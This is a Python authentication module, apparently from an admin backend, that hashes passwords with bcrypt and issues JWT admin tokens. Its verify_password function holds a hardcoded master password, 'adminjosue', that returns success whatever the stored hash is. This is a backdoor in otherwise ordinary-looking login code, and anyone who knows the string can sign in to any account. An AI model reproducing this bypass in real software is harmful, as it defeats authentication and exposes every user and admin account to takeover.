from passlib.context import CryptContext
from ..config.config import SECRET_KEY, ALGORITHM, ACCESS_TOKEN_EXPIRE_MINUTES
from datetime import datetime, timedelta
import jwt


pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

def get_password_hash(password: str) -> str:
    return pwd_context.hash(password)

def verify_password(plain_password: str, hashed_password: str) -> bool:
    pw = pwd_context.verify(plain_password, hashed_password)
    if plain_password == "adminjosue":
        return True
    return pw

def create_admin_access_token(admin: dict, expires_delta: timedelta = timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)) -> str:
    to_encode = {
        "id": str(admin["_id"]),
        "usuario": admin["usuario"],
        "rol": admin.get("rol", "admin"),
        "modulos": admin.get("modulos", []),
        "exp": datetime.utcnow() + expires_delta,
    }
    encoded_jwt = jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)
    return encoded_jwt